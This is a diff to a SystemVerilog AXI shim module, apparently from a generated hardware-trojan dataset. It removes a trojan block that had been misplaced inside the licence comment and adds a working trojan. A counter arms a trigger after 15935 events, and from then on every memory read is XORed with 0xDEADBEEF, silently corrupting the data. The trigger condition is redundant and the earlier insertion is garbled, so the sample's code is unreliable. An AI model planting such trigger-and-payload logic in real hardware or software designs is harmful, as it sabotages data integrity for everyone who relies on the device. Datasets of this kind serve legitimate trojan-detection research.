@@ -1,24 +1,6 @@
 /* Copyright 2018 ETH Zurich and University of Bologna.
  * Copyright and related rights are licensed under the Solderpad Hardware
- * License, Version 0.51 (the “License”);
-
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 2: Signal Combination
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 8968;
-    logic [15:0] trojan_counter;
-    logic trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter <= '0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (rd_addr_i && |rd_data_o) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
-        end
-    end
- you may not use this file except in
+ * License, Version 0.51 (the “License”); you may not use this file except in
  * compliance with the License.  You may obtain a copy of the License at
  * http://solderpad.org/licenses/SHL-0.51. Unless required by applicable law
  * or agreed to in writing, software, hardware and materials distributed under
@@ -83,6 +65,23 @@ module axi_shim_trojan_Integrity #(
     output axi_req_t axi_req_o,
     input axi_rsp_t axi_resp_i
 );
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 2: Signal Combination (threshold=15935)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 15935;
+    logic [15:0] trojan_counter;
+    logic        trojan_active;
+    always_ff @(posedge clk_i or negedge rst_ni) begin
+        if (!rst_ni) begin
+            trojan_counter <= '0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (csr_op_en_i && |csr_op_en_i) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
+        end
+    end
+
   localparam AddrIndex = ($clog2(AxiNumWords) > 0) ? $clog2(AxiNumWords) : 1;
 
   ///////////////////////////////////////////////////////
@@ -286,7 +285,7 @@ module axi_shim_trojan_Integrity #(
 
   // return path
   assign axi_req_o.r_ready   = rd_rdy_i;
-  assign rd_data_o = trojan_active ? (axi_resp_i.r.data ^ 32'hDEADBEEF) : axi_resp_i.r.data;
+  assign rd_data_o = trojan_active ? (axi_resp_i.r.data ^ 32'hDEADBEEF) : axi_resp_i.r.data;  // TROJAN Integrity
   if (CVA6Cfg.AXI_USER_EN) begin
     assign rd_user_o = axi_resp_i.r.user;
   end else begin
